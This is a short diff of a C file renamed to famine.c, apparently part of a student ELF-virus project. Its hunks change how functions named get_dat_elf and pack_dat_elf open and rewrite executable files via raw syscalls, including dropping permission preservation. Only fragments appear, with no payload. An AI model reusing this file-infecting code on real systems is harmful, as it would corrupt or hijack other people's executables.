@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   main.c                                             :+:      :+:    :+:   */
+/*   famine.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
+/*   By: naminei <naminei@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/07/02 21:39:37 by root             ###   ########.fr       */
+/*   Updated: 2019/08/23 14:22:57 by naminei          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -112,7 +112,7 @@ void	get_dat_elf(char *dir, char *file)
 		j++;
 	}
 	path[i + j] = '\0';
-	fd = syscall(OPEN, path, O_RDONLY|O_NONBLOCK, 0);
+	fd = syscall(OPEN, path, O_RDONLY|O_NONBLOCK);
 	if (fd == -1)
 		return ;
 	size = syscall(LSEEK, fd, 1, SEEK_END);
@@ -263,12 +263,8 @@ void		pack_dat_elf(char *path, int size, char *data)
 		return ;
 	}
 
-	/* 3. Get the file permissions */
-	struct stat	stats;
-	syscall(STAT, path, &stats);
-
-	/* 5. Re-open the file */
-	int fd = syscall(OPEN, path, O_WRONLY|O_TRUNC|O_EXCL, stats.st_mode);
+	/* 3. Re-open the file */
+	int fd = syscall(OPEN, path, O_WRONLY|O_TRUNC|O_EXCL);
 	if (fd == -1) {
 		write(1, "OPEN file failed\n", 17);
 		return ;
